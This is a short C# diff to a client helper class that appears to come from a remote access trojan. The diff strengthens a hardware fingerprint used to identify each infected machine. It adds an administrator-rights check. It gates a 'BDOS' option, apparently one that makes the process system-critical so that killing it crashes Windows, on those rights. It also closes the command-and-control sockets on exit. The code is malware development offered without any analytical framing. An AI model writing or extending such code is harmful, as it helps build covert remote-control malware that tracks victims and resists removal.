@@ -1,5 +1,8 @@
-﻿using System;
+﻿using Client.Sockets;
+using System;
+using System.IO;
 using System.Security.Cryptography;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 
@@ -10,10 +13,11 @@ namespace Client.Helper
         public static string HWID()
         {
             StringBuilder sb = new StringBuilder();
-            sb.Append(Environment.UserDomainName);
+            sb.Append(Environment.ProcessorCount);
             sb.Append(Environment.UserName);
             sb.Append(Environment.MachineName);
-            sb.Append(Environment.Version);
+            sb.Append(Environment.OSVersion);
+            sb.Append(new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
             return GetHash(sb.ToString());
         }
 
@@ -25,7 +29,7 @@ namespace Client.Helper
             StringBuilder strResult = new StringBuilder();
             foreach (byte b in bytesToHash)
                 strResult.Append(b.ToString("x2"));
-            return strResult.ToString().Substring(0, 12).ToUpper();
+            return strResult.ToString().Substring(0, 15).ToUpper();
         }
 
         private static Mutex _appMutex;
@@ -44,12 +48,17 @@ namespace Client.Helper
             }
         }
 
+        public static bool IsAdmin()
+        {
+            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+        }
         public static void ClientExit()
         {
-                if (Convert.ToBoolean(Settings.BDOS))
+                if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                     ProcessCritical.Exit();
             CloseMutex();
-            Environment.Exit(0);
+            ClientSocket.SslClient?.Close();
+            ClientSocket.Client?.Close();
         }
     }
 }
